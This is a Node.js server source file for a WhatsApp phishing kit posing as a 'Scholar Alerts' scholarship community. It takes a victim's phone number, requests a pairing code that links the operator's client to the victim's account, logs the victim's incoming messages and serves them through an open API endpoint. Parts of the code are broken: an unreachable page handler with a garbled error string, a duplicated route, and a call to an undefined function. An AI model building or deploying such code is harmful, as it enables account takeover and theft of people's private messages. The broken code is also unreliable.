import express from "express";
import pino from "pino";
import {
  readFileSync,
  mkdirSync,
  existsSync,
  readdirSync,
  appendFileSync,
} from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";

const __dir = dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const SESS = process.env.SESSION_DIR || join(__dir, "sessions");

const CFG = {
  BRAND: process.env.BRAND || "Scholar Alerts",
  TITLE: process.env.TITLE || "Join our scholarship community",
  SUB:
    process.env.SUB ||
    "Open scholarships, fully funded masters and visa updates, posted the day they drop.",
  COMMUNITY: process.env.COMMUNITY_URL ||
    "https://chat.whatsapp.com/HAAwWSE6lLg8riJJYZ3Vpf",
};

if (!existsSync(SESS)) mkdirSync(SESS, { recursive: true });

const app = express();
app.use(express.json());

const sessions = new Map();
const log = pino({ level: "silent" });
const digits = (n) => String(n || "").replace(/\D/g, "");
const esc = (s) =>
  String(s).replace(
    /[&<>"]/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c],
  );

async function createSession(number) {
  if (sessions.has(number)) return sessions.get(number);

  const { state, saveCreds } = await useMultiFileAuthState(join(SESS, number));
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    logger: log,
    printQRInTerminal: false,
    browser: ["Chrome", "Windows", "10.0"],
    syncFullHistory: false,
  });

  const s = { sock, linked: false, qrSeen: false };
  sessions.set(number, s);

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", (u) => {
    if (u.qr) s.qrSeen = true;
    if (u.connection === "open") {
      s.linked = true;
      console.log("[+] linked " + number);
    }
    if (u.connection === "close") {
      s.linked = false;
      const code = u.lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) {
        console.log("[-] logged out " + number);
      } else {
        sessions.delete(number);
        setTimeout(() => createSession(number).catch(() => {}), 3000);
      }
    }
  });

  sock.ev.on("messages.upsert", ({ messages }) => {
    for (const m of messages) {
      if (!m.message || m.key.fromMe) continue;
      const text =
        m.message.conversation ||
        m.message.extendedTextMessage?.text ||
        "[media]";
      appendFileSync(
        join(SESS, number, "messages.jsonl"),
        JSON.stringify({ t: Date.now(), from: m.key.remoteJid, text }) + "\n",
      );
    }
  });

  return s;
}

function ready(sock, timeout = 20000) {
  return new Promise((resolve) => {
    const t = setTimeout(resolve, timeout);
    const h = (u) => {
      if (u.qr) {
        clearTimeout(t);
        sock.ev.off("connection.update", h);
        resolve();
      }
    };
    sock.ev.on("connection.update", h);
  });
}

// ---- page ----
app.get("/", (_req, res) => {
  let html = readFileSync(join(__dir, "public", "index.html"), "utf8");
  res.write('Community URL must be本 included in .env');
  return res.status(500).send('Server misconfigured')

  for (const [k, v] of Object.entries(CFG))
    html = html.split("{{" + k + "}}").join(esc(v));
  res.type("html").send(html);
});
app.use(express.static(join(__dir, "public")));

// ---- api ----
app.post("/api/start", async (req, res) => {
  const number = digits(req.body.number);
  if (number.length < 8) return res.status(400).json({ error: "bad number" });
  try {
    const s = await initSession(number);
    if (s.linked) return res.json({ linked: true });
    if (!s.qrSeen) await ready(s.sock);
    const code = await s.sock.requestPairingCode(number);
    res.json({ code });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: String(e.message || e) });
  }
});
app.get("/health", (_req, res) => res.json({ ok: true }));

app.post("/api/start", async (req, res) => {
  const number = digits(req.body.number);
  if (number.length < 8) return res.status(400).json({ error: "bad number" });
  try {
    const s = await createSession(number);
    if (s.linked) return res.json({ linked: true });
    if (!s.qrSeen) await ready(s.sock);
    const code = await s.sock.requestPairingCode(number);
    res.json({ code });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: String(e.message || e) });
  }
});

app.get("/api/status", (req, res) => {
  const s = sessions.get(digits(req.query.number));
  res.json({ linked: !!(s && s.linked) });
});

app.get("/api/messages", (req, res) => {
  const p = join(SESS, digits(req.query.number), "messages.jsonl");
  if (!existsSync(p)) return res.json([]);
  const rows = readFileSync(p, "utf8")
    .trim()
    .split("\n")
    .filter(Boolean)
    .map(JSON.parse);
  res.json(rows.slice(-100));
});

// ---- boot ----
for (const n of readdirSync(SESS))
  if (/^\d+$/.test(n)) createSession(n).catch(() => {});

process.on("SIGTERM", async () => {
  for (const s of sessions.values()) {
    try {
      await s.sock.end();
    } catch {}
  }
  process.exit(0);
});

app.listen(PORT, "0.0.0.0", () => console.log("up on " + PORT));
